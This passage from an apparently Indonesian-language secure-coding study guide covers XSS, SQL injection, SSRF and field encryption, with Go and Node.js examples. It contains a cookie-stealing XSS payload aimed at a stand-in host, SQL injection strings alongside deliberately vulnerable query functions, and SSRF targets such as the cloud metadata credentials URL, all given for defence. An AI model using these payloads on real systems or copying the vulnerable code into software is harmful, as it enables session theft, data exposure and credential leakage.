package handler

import (
	"html/template"
	"net/http"
)

// orderNoteTemplate pakai html/template (bukan text/template) — Go otomatis
// HTML-escape semua data yang di-inject, jadi payload seperti
// <script>document.location='https://evil.example/steal?c='+document.cookie</script>
// akan tampil sebagai teks biasa, bukan tereksekusi sebagai script.
var orderNoteTemplate = template.Must(template.New("order_note").Parse(`
	<div class="order-note">{{.Note}}</div>
`))

func RenderOrderNote(w http.ResponseWriter, note string) error {
	return orderNoteTemplate.Execute(w, struct{ Note string }{Note: note})
}

// SecurityHeadersMiddleware menambahkan Content-Security-Policy sebagai lapisan
// pertahanan tambahan — walau ada script yang lolos ke-inject, browser tetap
// blok eksekusinya kalau sumbernya gak sesuai policy.
func SecurityHeadersMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy",
			"default-src 'self'; script-src 'self'; object-src 'none'")
		next.ServeHTTP(w, r)
	})
}
```

### Contoh Kode — Node.js
```javascript
const express = require('express');
const helmet = require('helmet');
const escapeHtml = require('escape-html');

const app = express();

// helmet men-set Content-Security-Policy dan header keamanan lain sebagai
// lapisan pertahanan tambahan — walau ada script yang lolos ke-inject,
// browser tetap blok eksekusinya kalau sumbernya gak sesuai policy.
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"],
    },
  })
);

// Kalau OrderFlow render HTML sendiri (server-side rendering catatan order),
// setiap data user WAJIB di-escape di titik output, bukan cuma waktu disimpan.
app.get('/orders/:id/note', async (req, res) => {
  const order = await findOrderById(Number(req.params.id));
  const safeNote = escapeHtml(order.note); // <script> jadi &lt;script&gt;, tampil sebagai teks
  res.send(`<div class="order-note">${safeNote}</div>`);
});

module.exports = app;
```

### Trade-off & Pitfall
- Sanitasi/escaping harus dilakukan di titik output (saat data dirender ke HTML), bukan cuma saat data disimpan — data yang sama bisa dirender di konteks berbeda (HTML body, atribut HTML, JavaScript string, URL) dan masing-masing butuh escaping yang berbeda.
- Kalau OrderFlow render lewat framework frontend modern (React, Vue), sebagian besar escaping sudah otomatis (misalnya JSX meng-escape default) — risiko terbesar biasanya justru saat developer sengaja bypass mekanisme itu (`dangerouslySetInnerHTML` di React, `v-html` di Vue) untuk render HTML "yang dipercaya" padahal sumbernya dari user.
- CSP yang terlalu longgar (`script-src *` atau `unsafe-inline`) gak memberi proteksi berarti; CSP yang terlalu strict bisa mematahkan fungsi legit (inline script, third-party widget) — perlu disesuaikan bertahap dan ditest.
- Token/session yang disimpan di `localStorage` bisa dicuri kalau ada XSS (JavaScript attacker bisa baca localStorage), sementara cookie `httpOnly` gak bisa dibaca lewat JavaScript sama sekali — ini salah satu alasan refresh token disarankan disimpan di httpOnly cookie (Phase 1 topik 4), bukan localStorage.

### Kapan Dipakai
Perlindungan XSS relevan di semua titik di mana OrderFlow menampilkan data yang berasal dari input user (nama produk dari admin, catatan order dari customer, review) ke browser pengguna lain — baik lewat server-side rendering maupun API yang datanya dikonsumsi frontend SPA.

### Sering Ditanya Saat Interview
- "Apa beda stored dan reflected XSS?" — stored XSS payload tersimpan permanen (misalnya di database) dan tereksekusi setiap kali data itu ditampilkan ke siapapun; reflected XSS payload langsung direfleksikan balik dari request (biasanya URL/form) ke response tanpa tersimpan, cuma mengenai orang yang mengklik link yang sudah disusupi.
- "Kenapa httpOnly cookie membantu mitigasi dampak XSS?" — walau attacker berhasil menjalankan script di halaman lewat XSS, `httpOnly` mencegah JavaScript (termasuk script attacker itu) membaca isi cookie, jadi token sensitif yang disimpan di sana tetap gak bisa dicuri lewat XSS.
- "Apa fungsi Content-Security-Policy dan kenapa itu 'defense in depth' bukan solusi utama?" — CSP membatasi dari mana script boleh dimuat/dieksekusi oleh browser, jadi kalau ada payload yang lolos ke-inject, browser tetap bisa blok eksekusinya; tapi itu lapisan tambahan, bukan pengganti escaping output yang benar di sisi server/frontend.

---

## 22. SQL Injection

### Apa itu?
SQL Injection adalah vulnerability di mana input user digabungkan langsung ke dalam query SQL (biasanya lewat string concatenation/formatting), sehingga attacker bisa menyisipkan potongan SQL sendiri yang mengubah makna query aslinya — bisa buat membaca data yang seharusnya gak boleh diakses, bypass authentication, atau bahkan menghapus/mengubah data.

### Kenapa dibutuhkan?
Database OrderFlow menyimpan data sangat sensitif — email & password hash user, riwayat order, data pembayaran. Query yang dibangun dengan string concatenation dari input user (misalnya parameter pencarian produk) memberi attacker jalan langsung buat "berbicara" ke database melewati semua business logic aplikasi.

### Cara Kerja
```
VULNERABLE:
  query := "SELECT * FROM products WHERE name LIKE '%" + userInput + "%'"
  Input attacker: ' OR '1'='1' --
  Query jadi:  SELECT * FROM products WHERE name LIKE '%' OR '1'='1' --%'
             -> kondisi WHERE selalu true -> semua row (termasuk data yang seharusnya
                gak boleh diakses lewat pencarian ini) ikut kebalik

FIX — parameterized query:
  query := "SELECT * FROM products WHERE name LIKE $1"
  db.Query(query, "%"+userInput+"%")
             -> userInput dikirim sebagai DATA lewat protokol database, terpisah dari
                struktur query -> database gak pernah menafsirkannya sebagai SQL
```

### Contoh Kode — Go
Versi **rentan** — pola yang sering muncul di endpoint search kalau developer gak sadar bahayanya:
```go
// BUG: string formatting langsung dari input user ke query SQL.
func SearchProductsVulnerable(ctx context.Context, db *pgxpool.Pool, name string) ([]Product, error) {
	query := fmt.Sprintf(`SELECT id, name, price FROM products WHERE name ILIKE '%%%s%%'`, name)
	rows, err := db.Query(ctx, query)
	// Input attacker: ' OR '1'='1
	// Query jadi: ... WHERE name ILIKE '%' OR '1'='1' --%'
	// -> membalikkan semua row, atau bisa disusupi lebih jauh (UNION SELECT ke tabel users, dst)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	return scanProducts(rows)
}
```
Versi **fixed** — parameterized query, input user selalu dikirim sebagai data, gak pernah jadi bagian struktur SQL:
```go
func SearchProducts(ctx context.Context, db *pgxpool.Pool, name string) ([]Product, error) {
	rows, err := db.Query(ctx,
		`SELECT id, name, price FROM products WHERE name ILIKE $1`,
		"%"+name+"%",
	)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	return scanProducts(rows)
}
```

### Contoh Kode — Node.js
Versi **rentan**:
```javascript
// BUG: string concatenation langsung dari input user ke query SQL.
async function searchProductsVulnerable(pool, name) {
  const query = `SELECT id, name, price FROM products WHERE name ILIKE '%${name}%'`;
  const result = await pool.query(query);
  // Input attacker: ' OR '1'='1
  // Query jadi: ... WHERE name ILIKE '%' OR '1'='1' --%'
  // -> membalikkan semua row, atau bisa disusupi lebih jauh (UNION SELECT ke tabel users, dst)
  return result.rows;
}
```
Versi **fixed** — parameterized query lewat placeholder `$1` yang didukung driver `pg`:
```javascript
async function searchProducts(pool, name) {
  const result = await pool.query(
    'SELECT id, name, price FROM products WHERE name ILIKE $1',
    [`%${name}%`]
  );
  return result.rows;
}

module.exports = { searchProducts };
```

### Trade-off & Pitfall
- Parameterized query gak melindungi dynamic identifier seperti nama kolom/tabel (misalnya fitur "sort by" yang menerima nama kolom dari query param) — placeholder cuma bisa dipakai untuk value/data, bukan untuk nama kolom/tabel. Untuk itu wajib pakai whitelist eksplisit (misal `map[string]bool` kolom yang diizinkan), gak boleh langsung pakai input user sebagai nama kolom.
- ORM/query builder mengurangi risiko karena secara default memakai parameterized query, tapi masih bisa disusupi kalau developer memakai fitur "raw query" atau string interpolation di dalam ORM itu sendiri — ORM bukan garansi otomatis aman.
- Least privilege (Phase 1 topik 9) tetap penting sebagai lapisan tambahan — kalau DB user yang dipakai aplikasi cuma punya akses read-only ke tabel tertentu, dampak SQL injection yang lolos pun jadi terbatas.
- Error message dari database yang di-passthrough langsung ke response API (misalnya detail syntax error SQL) bisa membantu attacker melakukan "blind" SQL injection secara lebih efisien — jangan expose raw database error ke client.

### Kapan Dipakai
Parameterized query wajib dipakai di semua query yang melibatkan input dari user, tanpa kecuali — ini bukan sesuatu yang "kadang perlu, kadang gak", melainkan default absolut setiap kali menulis raw SQL. Untuk dynamic identifier (kolom sort, nama tabel dinamis), pakai whitelist eksplisit.

### Sering Ditanya Saat Interview
- "Kenapa parameterized query mencegah SQL injection secara fundamental, bukan cuma escaping karakter berbahaya?" — karena data user dikirim ke database lewat channel yang terpisah dari teks query (protokol database membedakan "ini struktur query" vs "ini data"), sehingga database gak pernah menafsirkan isi data itu sebagai bagian dari sintaks SQL, apapun karakter yang ada di dalamnya.
- "Kalau butuh fitur sort/order by dinamis berdasarkan pilihan user, gimana caranya tetap aman?" — pakai whitelist nama kolom yang diizinkan di kode (misalnya map/set eksplisit), validasi input user terhadap whitelist itu, baru dipakai sebagai nama kolom — jangan langsung interpolasi input user sebagai identifier SQL.
- "Apa itu blind SQL injection?" — teknik SQL injection di mana attacker gak langsung melihat hasil query di response, tapi menyimpulkan informasi lewat sinyal tidak langsung (perbedaan waktu respons, true/false dari perilaku aplikasi) — makanya menyembunyikan detail error database juga bagian dari mitigasi.

---

## 23. SSRF

### Apa itu?
SSRF (Server-Side Request Forgery) adalah vulnerability di mana attacker memanfaatkan server OrderFlow untuk membuat request HTTP ke tujuan yang dikendalikan attacker — biasanya lewat fitur yang menerima URL dari user (misalnya "import gambar produk dari URL" atau "daftarkan webhook URL partner") — dan server itu punya akses jaringan yang gak dimiliki attacker secara langsung (misalnya ke service internal, database internal, atau cloud metadata endpoint).

### Kenapa dibutuhkan?
Kalau OrderFlow punya fitur admin "import gambar produk dari URL" yang server-nya langsung fetch URL itu tanpa validasi, attacker (atau admin yang disusupi) bisa memasukkan URL seperti `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (cloud metadata endpoint) atau `http://internal-payment-service:8080/admin` — request itu datang dari server OrderFlow sendiri yang punya akses jaringan internal, bukan dari attacker langsung, sehingga bisa melewati firewall/network segmentation yang seharusnya melindungi service internal dari akses luar.

### Cara Kerja
```
Fitur: admin submit URL gambar produk -> server fetch URL itu -> simpan hasilnya

VULNERABLE: server fetch URL apapun yang diberikan, tanpa validasi tujuan
  -> attacker submit URL ke internal service / cloud metadata endpoint
  -> server (yang punya akses jaringan internal) yang melakukan request itu, bukan attacker

FIX:
  1. Parse URL, resolve hostname ke IP
  2. Tolak kalau IP masuk private/link-local/loopback range (10.x, 172.16-31.x, 192.168.x,
     169.254.x, 127.x) — inilah target favorit SSRF
  3. Batasi scheme cuma http/https, timeout ketat, jangan follow redirect otomatis
     tanpa re-validasi tujuan redirect-nya juga
```

### Contoh Kode — Go
```go
package importer

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"time"
)

// isPrivateOrReservedIP menolak target yang mengarah ke jaringan internal —
// termasuk cloud metadata endpoint (169.254.169.254) yang sering jadi target SSRF.
func isPrivateOrReservedIP(ip net.IP) bool {
	privateRanges := []string{
		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
		"127.0.0.0/8", "169.254.0.0/16", "::1/128", "fc00::/7",
	}
	for _, cidr := range privateRanges {
		_, block, _ := net.ParseCIDR(cidr)
		if block.Contains(ip) {
			return true
		}
	}
	return false
}

// FetchProductImage dipakai fitur "import gambar produk dari URL" — memvalidasi
// tujuan URL sebelum server benar-benar melakukan request ke sana, supaya
// admin (atau attacker yang menyusup lewat form ini) gak bisa memaksa server
// memanggil service internal/cloud metadata endpoint.
func FetchProductImage(ctx context.Context, rawURL string) ([]byte, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
		return nil, fmt.Errorf("invalid or disallowed url scheme")
	}

	ips, err := net.LookupIP(parsed.Hostname())
	if err != nil {
		return nil, fmt.Errorf("cannot resolve host: %w", err)
	}
	for _, ip := range ips {
		if isPrivateOrReservedIP(ip) {
			return nil, fmt.Errorf("target host resolves to a disallowed internal address")
		}
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// jangan follow redirect otomatis — redirect bisa dipakai buat
			// "lompat" ke target internal setelah lolos validasi awal
			return http.ErrUseLastResponse
		},
	}

	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return readBody(resp)
}
```

### Contoh Kode — Node.js
```javascript
const dns = require('dns').promises;
const net = require('net');
const axios = require('axios');
const ipRangeCheck = require('ip-range-check');

const PRIVATE_RANGES = [
  '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',
  '127.0.0.0/8', '169.254.0.0/16', '::1/128', 'fc00::/7',
];

// isPrivateOrReservedIp menolak target yang mengarah ke jaringan internal —
// termasuk cloud metadata endpoint (169.254.169.254) yang sering jadi target SSRF.
function isPrivateOrReservedIp(ip) {
  return PRIVATE_RANGES.some((range) => ipRangeCheck(ip, range));
}

// fetchProductImage dipakai fitur "import gambar produk dari URL" — memvalidasi
// tujuan URL sebelum server benar-benar melakukan request ke sana, supaya
// admin (atau attacker yang menyusup lewat form ini) gak bisa memaksa server
// memanggil service internal/cloud metadata endpoint.
async function fetchProductImage(rawUrl) {
  const parsed = new URL(rawUrl);
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    throw new Error('invalid or disallowed url scheme');
  }

  const addresses = await dns.lookup(parsed.hostname, { all: true });
  for (const { address } of addresses) {
    if (!net.isIP(address) || isPrivateOrReservedIp(address)) {
      throw new Error('target host resolves to a disallowed internal address');
    }
  }

  // maxRedirects: 0 -- jangan follow redirect otomatis; redirect bisa dipakai
  // buat "lompat" ke target internal setelah lolos validasi awal
  const response = await axios.get(rawUrl, { timeout: 5000, maxRedirects: 0 });
  return response.data;
}

module.exports = { fetchProductImage };
```

### Trade-off & Pitfall
- Validasi IP di atas rawan DNS rebinding: attacker bisa membuat domain yang resolve ke IP publik saat divalidasi, lalu diubah resolve ke IP internal tepat saat request sesungguhnya dikirim (time-of-check to time-of-use gap). Mitigasi lebih kuat: resolve DNS sekali, lalu connect langsung ke IP hasil resolve itu (bukan resolve ulang), atau pakai proxy keluar khusus yang di-allowlist.
- Blocking berdasarkan hostname string ("jangan boleh 'localhost'") gak cukup — attacker bisa memakai representasi IP alternatif (`0177.0.0.1` notasi octal, `2130706433` desimal untuk `127.0.0.1`, IPv6-mapped address) yang tetap resolve ke target internal tapi lolos pattern matching string sederhana. Validasi harus dilakukan di level IP setelah resolusi DNS, seperti contoh di atas.
- Allowlist domain tujuan yang eksplisit (misalnya cuma boleh fetch dari CDN gambar yang dipercaya) jauh lebih aman daripada blocklist IP privat — tapi gak selalu memungkinkan kalau fiturnya memang harus menerima URL sembarang dari user (misalnya webhook partner).
- Timeout ketat penting juga sebagai mitigasi tambahan — tanpa itu, SSRF bisa dipakai buat melakukan port scanning internal secara lambat (mengukur response time buat menyimpulkan port mana yang open).

### Kapan Dipakai
Wajib diterapkan di setiap fitur di mana server OrderFlow melakukan HTTP request ke URL yang berasal dari input user atau pihak eksternal — import gambar dari URL, registrasi webhook URL partner, generate PDF dari halaman web, atau integrasi apapun yang menerima "URL tujuan" sebagai parameter.

### Sering Ditanya Saat Interview
- "Kenapa cukup mengecek 'apakah hostname-nya localhost' gak cukup untuk mencegah SSRF?" — attacker bisa menggunakan representasi alternatif dari IP internal (encoding desimal/octal, DNS yang resolve ke IP privat, IPv6-mapped address) yang tetap mengarah ke target internal tapi lolos dari pattern matching string sederhana; validasi harus di level IP setelah resolusi DNS.
- "Apa itu DNS rebinding dan kenapa itu bikin validasi SSRF lebih sulit?" — attacker mengontrol domain yang bisa diubah hasil resolusinya antara waktu validasi dan waktu request sesungguhnya dikirim, sehingga validasi awal (IP publik yang aman) jadi gak relevan lagi saat request benar-benar dilakukan.
- "Kenapa cloud metadata endpoint (169.254.169.254) sering jadi target SSRF?" — endpoint itu, kalau bisa diakses, bisa membocorkan credential/IAM role yang dipakai instance cloud tempat aplikasi berjalan, yang bisa dipakai attacker buat eskalasi akses jauh lebih luas dari sekadar SSRF awal.

---

## 24. Encryption Fundamentals

### Apa itu?
Encryption adalah proses mengubah data jadi bentuk yang gak terbaca (ciphertext) menggunakan sebuah key, dengan proses itu bisa dibalik (didekripsi) memakai key yang sesuai — beda dengan hashing (Phase 1 topik 2) yang satu arah dan gak bisa dibalik. Ada dua kategori utama: symmetric encryption (satu key yang sama dipakai buat enkripsi dan dekripsi) dan asymmetric encryption (sepasang key publik-privat, yang satu buat enkripsi/verifikasi, yang lain buat dekripsi/signing).

### Kenapa dibutuhkan?
Sebagian data OrderFlow butuh disimpan dalam bentuk yang bisa dibaca ulang oleh sistem nanti (misalnya nomor telepon customer buat keperluan notifikasi, atau data yang butuh ditampilkan lagi ke user) — beda dengan password yang cukup di-hash karena gak pernah perlu "dibaca ulang" dalam bentuk asli (Phase 1 topik 2). Untuk data seperti ini, enkripsi dipakai supaya kalau database bocor, data itu tetap gak terbaca tanpa key yang benar. Di sisi lain, TLS (yang membungkus semua komunikasi HTTPS OrderFlow) memakai kombinasi symmetric & asymmetric encryption buat melindungi data selama transit di jaringan.

### Cara Kerja
```
Symmetric (contoh: AES-GCM):
  Plaintext + Key -----> Encrypt -----> Ciphertext
  Ciphertext + Key(sama) -----> Decrypt -----> Plaintext
  Cepat, cocok untuk enkripsi data dalam jumlah besar (data at rest).
  Masalah: gimana cara membagikan key itu dengan aman ke pihak yang butuh dekripsi?

Asymmetric (contoh: RSA):
  Plaintext + Public Key -----> Encrypt -----> Ciphertext
  Ciphertext + Private Key -----> Decrypt -----> Plaintext
  Lebih lambat, tapi gak perlu membagikan secret — public key boleh disebar bebas.

TLS (dipakai semua komunikasi HTTPS OrderFlow):
  Handshake pakai asymmetric (exchange/verifikasi identitas server) untuk menyepakati
  satu symmetric session key -> sisa komunikasi pakai symmetric encryption (lebih cepat)
```

### Contoh Kode — Go
```go
package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"io"
	"os"
)

// encryptionKey diambil dari secret manager/env, HARUS 32 byte untuk AES-256.
var encryptionKey = []byte(os.Getenv("FIELD_ENCRYPTION_KEY"))

// EncryptField dipakai untuk field sensitif yang perlu dibaca ulang nanti,
// misalnya nomor telepon customer — beda dengan password yang cukup di-hash
// (Phase 1 topik 2) karena password gak pernah perlu dibaca ulang dalam bentuk asli.
func EncryptField(plaintext string) (string, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	// nonce disimpan menempel di depan ciphertext, dibutuhkan lagi saat dekripsi
	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func DecryptField(encoded string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", errors.New("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}
```

### Contoh Kode — Node.js
```javascript
const crypto = require('crypto');

// encryptionKey diambil dari secret manager/env, HARUS 32 byte untuk AES-256.
const ENCRYPTION_KEY = Buffer.from(process.env.FIELD_ENCRYPTION_KEY, 'hex');
const ALGORITHM = 'aes-256-gcm';

// encryptField dipakai untuk field sensitif yang perlu dibaca ulang nanti,
// misalnya nomor telepon customer — beda dengan password yang cukup di-hash
// (Phase 1 topik 2) karena password gak pernah perlu dibaca ulang dalam bentuk asli.
function encryptField(plaintext) {
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, nonce);

  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const authTag = cipher.getAuthTag();

  // nonce dan authTag disimpan menempel, dibutuhkan lagi saat dekripsi
  return Buffer.concat([nonce, authTag, ciphertext]).toString('base64');
}

function decryptField(encoded) {
  const data = Buffer.from(encoded, 'base64');
  const nonce = data.subarray(0, 12);
  const authTag = data.subarray(12, 28);
  const ciphertext = data.subarray(28);

  const decipher = crypto.createDecipheriv(ALGORITHM, ENCRYPTION_KEY, nonce);
  decipher.setAuthTag(authTag);

  const plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  return plaintext.toString('utf8');
}

module.exports = { encryptField, decryptField };
```

### Trade-off & Pitfall
- Enkripsi data at rest gak melindungi dari aplikasi yang sudah dikompromikan — kalau attacker dapat akses ke aplikasi yang sedang berjalan (bukan cuma database-nya), dia bisa memanggil fungsi decrypt yang sama seperti aplikasi legitimate, karena key enkripsi ada di memori aplikasi itu. Ini melindungi dari skenario spesifik: database/backup bocor tanpa akses ke aplikasi/secret manager-nya.
- Manajemen key adalah bagian tersulit, bukan algoritmanya — kalau key disimpan di tempat yang sama dengan data terenkripsi (misalnya hardcode di kode atau di file config yang sama), enkripsi jadi gak berarti. Idealnya key disimpan di secret manager (AWS KMS, HashiCorp Vault) yang terpisah dari database.
- Jangan pakai algoritma symmetric mode lama yang gak punya integrity check (misalnya AES-CBC polos) — AES-GCM (dipakai di contoh) itu authenticated encryption, sekaligus mendeteksi kalau ciphertext dimodifikasi (auth tag gak akan match), bukan cuma menyembunyikan isi data.
- Jangan gunakan key yang sama untuk mengenkripsi semua field/semua tenant — kalau satu key bocor, dampaknya sebaiknya terbatas; pertimbangkan key rotation dan/atau key terpisah per konteks sensitif.
- Encryption ≠ hashing: kalau data gak pernah butuh dibaca ulang dalam bentuk asli (password), pakai hashing satu arah (bcrypt/Argon2, Phase 1 topik 2), jangan dienkripsi — enkripsi selalu reversible, itu risiko tambahan yang gak perlu diambil kalau memang gak butuh baca ulang.

### Kapan Dipakai
Enkripsi data at rest dipakai untuk field sensitif yang memang perlu dibaca ulang dalam bentuk asli oleh sistem (nomor telepon, alamat lengkap, data yang diregulasi seperti PII tertentu) — bukan untuk password (pakai hashing) atau data yang gak sensitif. TLS untuk data in transit wajib di semua komunikasi OrderFlow tanpa kecuali, terlepas dari sensitivitas datanya.

### Sering Ditanya Saat Interview
- "Kapan pakai encryption dan kapan pakai hashing untuk data sensitif?" — hashing untuk data yang cuma perlu diverifikasi kecocokannya dan gak pernah perlu dibaca ulang dalam bentuk asli (password); encryption untuk data yang memang perlu didekripsi kembali ke bentuk asli saat dibutuhkan sistem (nomor telepon, alamat).
- "Kenapa TLS memakai kombinasi symmetric dan asymmetric encryption, bukan salah satu saja?" — asymmetric dipakai di awal handshake buat verifikasi identitas server dan menyepakati session key secara aman tanpa perlu membagikan secret terlebih dahulu; setelah itu symmetric dipakai untuk sisa komunikasi karena jauh lebih cepat dibanding asymmetric untuk data dalam jumlah besar.
- "Kalau data di database sudah dienkripsi, apakah itu berarti aman meski aplikasi yang mengaksesnya dikompromikan?" — enggak, karena aplikasi yang legitimate (dan karenanya attacker yang berhasil menyusup ke aplikasi itu) tetap punya akses ke key buat dekripsi; enkripsi data at rest melindungi dari skenario kebocoran database/backup tanpa akses ke aplikasi/secret manager-nya.

---

**Selanjutnya:** [Phase 03 — Database](./phase-03-database.md)
</content>
